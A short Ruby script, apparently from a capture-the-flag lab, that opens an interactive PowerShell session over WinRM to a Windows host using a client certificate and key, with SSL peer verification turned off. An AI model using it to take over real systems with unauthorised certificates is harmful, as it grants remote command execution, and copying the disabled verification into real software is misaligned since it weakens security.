require 'winrm'

# Author: Alamot

conn = WinRM::Connection.new( 
  endpoint: 'https://10.129.239.169:5986/wsman',
  transport: :ssl,
  client_cert: '/home/mastadon/labs/sizzle/certnew2.cer',
  client_key: '/home/mastadon/labs/sizzle/request2.key',
  :no_ssl_peer_verification => true
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets        
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end    
    puts "Exiting with code #{output.exitcode}"
end
